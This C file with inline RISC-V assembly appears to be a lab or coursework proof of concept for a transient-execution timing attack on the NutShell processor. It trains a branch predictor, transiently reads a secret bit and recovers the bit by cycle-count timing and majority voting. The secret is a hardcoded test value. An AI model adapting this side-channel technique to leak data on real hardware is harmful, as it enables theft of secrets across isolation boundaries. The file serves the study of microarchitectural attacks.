#include <stdio.h>
#include <stdint.h>
#include "util.h"
#include "encoding.h"

#define TRIAL 5
#define NBRANCH 5

static uint8_t secret[4] = { 0xef, 0xbe, 0xad, 0x52};

#define S_WORD 32

void victim(uint64_t pred, uint64_t idx) {
    asm("mv a0, %[pred]\n"
        "li a1, 0x12345678\n"
        "li a2, 0x00001234\n"
        "remuw a0, a0, a1\n"
        "div a0, a0, a1\n"
        "beq a0, a2, 1f\n"
        "la t0, %[secret]\n"
        "lwu t0, 0(t0)\n"
        "srl t0, t0, %[idx]\n"
        "andi t0, t0, 0x1\n"
        "slli t0, t0, 31\n"
        "remuw t0, t0, a1\n"
        "1:\n"
        :
        : [pred] "r" (pred), [secret] "i" (secret), [idx] "r" (idx)
        : "a0", "a1", "a2", "t0");
}

int main(void) {
    uint64_t sec = 0xdeadbeef;
    uint8_t bits[S_WORD] = {0,};
    uint8_t votes[S_WORD] = {0,};

    /* uint64_t start, end, dummy; */

    printf("[*] New transient execution attack on NutShell\n");

    uint64_t start, end;
    for (int idx = S_WORD - 1; idx >= 0; idx--) {
        printf("[%2d] Want(%d) Cycles: ", idx, (int) ((sec >> idx) & 1));
        uint64_t cycles[TRIAL] = {0, };
        for (int t = 0; t < TRIAL; t++) {
            for (int i = NBRANCH - 1; i >= 0; i--) {
                uint64_t pred = (((uint64_t) i - 1) >> 63) * 0x1234 + 0x12345678;

                asm("csrr %0, cycle\n"
                    : "=r"(start));
                /* TODO: Run victim function & measure timing */
                victim(pred, idx);
                asm("csrr %0, cycle\n"
                    : "=r"(end));
            }

            cycles[t] = end - start;
            printf("%ld ", cycles[t]);
        }

        int sum = 0;
        for (int t = 0; t < TRIAL; t++) {
            if (cycles[t] > 30 /* TODO: appropriate criterion */)
                sum++;
        }

        bits[idx] = (sum > TRIAL/2)? 1:0;
        votes[idx] = (sum > TRIAL/2)? sum:TRIAL - sum;
        printf(" --> %d (%d/%d)\n", bits[idx], votes[idx], TRIAL);
    }

    printf("[*] Secret: 0x");
    for (int idx = S_WORD - 4; idx >= 0; idx-=4) {
        uint16_t hex = bits[idx+3] << 3 | bits[idx+2] << 2 | bits[idx+1] << 1 | bits[idx];
        printf("%x", hex);
    }
    printf("\n");

    return 0;
}
